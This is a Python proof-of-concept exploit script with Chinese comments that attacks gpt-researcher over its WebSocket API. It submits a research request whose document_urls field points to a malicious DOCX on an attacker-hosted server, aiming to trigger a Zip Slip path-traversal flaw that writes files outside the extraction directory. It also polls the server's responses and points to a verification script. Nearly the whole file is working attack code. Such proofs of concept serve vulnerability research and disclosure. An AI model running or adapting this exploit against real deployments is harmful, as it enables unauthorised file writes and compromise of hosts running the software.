#!/usr/bin/env python3
"""
通过gpt-researcher的document_urls功能触发Zip Slip漏洞
使用正常的API调用，模拟真实攻击场景
"""

import asyncio
import json
import sys
import time

try:
    import websockets
except ImportError:
    print("[!] websockets module not found")
    print("[*] Installing: pip install websockets")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "websockets"])
    import websockets


class GPTResearcherExploit:
    """通过document_urls触发Zip Slip的exploit类"""

    def __init__(self, ws_url="ws://localhost:8002/ws", malicious_url=None):
        self.ws_url = ws_url
        self.malicious_url = malicious_url or "http://host.docker.internal:8888/malicious_document.docx"

    async def send_exploit(self):
        """发送包含恶意document_url的研究请求"""

        print("=" * 70)
        print("GPT-Researcher Zip Slip Exploit")
        print("=" * 70)

        print(f"\n[*] Target WebSocket: {self.ws_url}")
        print(f"[*] Malicious URL: {self.malicious_url}")

        # 构造payload
        payload = {
            "task": "Please analyze this document for me",
            "report_type": "research_report",
            "report_source": "hybrid",  # 使用hybrid以确保处理documents
            "source_urls": [],
            "document_urls": [self.malicious_url],  # ← 恶意URL在这里
            "tone": "Objective",
            "headers": {},
            "query_domains": [],
            "mcp_enabled": False,
            "mcp_strategy": "fast",
            "mcp_configs": []
        }

        print(f"\n[*] Payload:")
        print(json.dumps(payload, indent=2))

        try:
            # 连接到WebSocket
            print(f"\n[*] Connecting to {self.ws_url}...")
            async with websockets.connect(self.ws_url, ping_interval=None) as websocket:
                print(f"[✓] Connected successfully")

                # 发送start命令
                start_command = "start" + json.dumps(payload)
                print(f"\n[*] Sending exploit payload...")
                await websocket.send(start_command)
                print(f"[✓] Payload sent!")

                print(f"\n[*] Waiting for gpt-researcher to process...")
                print(f"[*] This will:")
                print(f"    1. Download the malicious DOCX from our server")
                print(f"    2. Extract it using UnstructuredWordDocumentLoader")
                print(f"    3. If vulnerable: Files will be written outside temp directory")
                print(f"\n[*] Monitoring responses...\n")

                # 接收响应
                response_count = 0
                start_time = time.time()
                max_wait = 120  # 最多等待2分钟

                while True:
                    try:
                        # 设置超时
                        response = await asyncio.wait_for(
                            websocket.recv(),
                            timeout=10.0
                        )

                        response_count += 1

                        # 解析响应
                        try:
                            data = json.loads(response)
                            msg_type = data.get('type', 'unknown')
                            content = data.get('content', '')
                            output = data.get('output', '')

                            # 显示响应
                            timestamp = time.strftime('%H:%M:%S')
                            print(f"[{timestamp}] Response #{response_count} - Type: {msg_type}")

                            if content:
                                print(f"           Content: {content[:100]}...")
                            if output:
                                if isinstance(output, dict):
                                    print(f"           Output: {json.dumps(output, indent=2)}")
                                else:
                                    print(f"           Output: {str(output)[:100]}...")

                            # 检查是否完成
                            if msg_type == 'path':
                                print(f"\n[✓] Research completed!")
                                print(f"[*] File paths: {output}")
                                break

                            if msg_type == 'error':
                                print(f"\n[!] Error occurred: {content}")
                                print(f"[*] This might indicate the vulnerability was triggered!")
                                break

                        except json.JSONDecodeError:
                            print(f"[{timestamp}] Non-JSON response: {response[:100]}")

                        # 超时检查
                        if time.time() - start_time > max_wait:
                            print(f"\n[!] Timeout after {max_wait} seconds")
                            break

                    except asyncio.TimeoutError:
                        elapsed = time.time() - start_time
                        print(f"[*] No response for 10s (total: {elapsed:.0f}s)...")

                        if elapsed > max_wait:
                            print(f"[!] Max wait time exceeded")
                            break

                    except websockets.exceptions.ConnectionClosed:
                        print(f"\n[!] WebSocket connection closed")
                        break

                print(f"\n[*] Total responses received: {response_count}")
                print(f"[*] Total time: {time.time() - start_time:.2f} seconds")

        except ConnectionRefusedError:
            print(f"\n[✗] Connection refused!")
            print(f"[*] Is gpt-researcher running?")
            print(f"[*] Try: docker-compose up -d gpt-researcher")
            return False

        except Exception as e:
            print(f"\n[✗] Error: {e}")
            import traceback
            traceback.print_exc()
            return False

        print(f"\n[*] Exploit execution completed")
        print(f"\n[*] Next step: Run verification script")
        print(f"    bash verify_vulnerability.sh")
        print("=" * 70)
        return True


async def quick_test():
    """快速测试连接"""
    print("[*] Testing connection to gpt-researcher...")

    try:
        async with websockets.connect("ws://localhost:8002/ws", ping_interval=None) as ws:
            print("[✓] Connection successful!")

            # 发送ping
            await ws.send("ping")
            response = await asyncio.wait_for(ws.recv(), timeout=5.0)

            if response == "pong":
                print("[✓] Server responding correctly")
                return True
            else:
                print(f"[!] Unexpected response: {response}")
                return False

    except Exception as e:
        print(f"[✗] Connection failed: {e}")
        print(f"\n[*] Troubleshooting:")
        print(f"    1. Is Docker running? docker ps | grep gpt-researcher")
        print(f"    2. Is port mapped correctly? Should be 127.0.0.1:8002:8000")
        print(f"    3. Try: docker-compose logs gpt-researcher")
        return False


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Exploit gpt-researcher via malicious document_url"
    )
    parser.add_argument(
        '--url',
        default="ws://localhost:8002/ws",
        help="WebSocket URL (default: ws://localhost:8002/ws)"
    )
    parser.add_argument(
        '--malicious-url',
        default="http://host.docker.internal:8888/malicious_document.docx",
        help="URL of malicious document"
    )
    parser.add_argument(
        '--test',
        action='store_true',
        help="Just test connection, don't exploit"
    )

    args = parser.parse_args()

    if args.test:
        # 仅测试连接
        asyncio.run(quick_test())
    else:
        # 执行exploit
        exploit = GPTResearcherExploit(
            ws_url=args.url,
            malicious_url=args.malicious_url
        )
        asyncio.run(exploit.send_exploit())


if __name__ == "__main__":
    main()
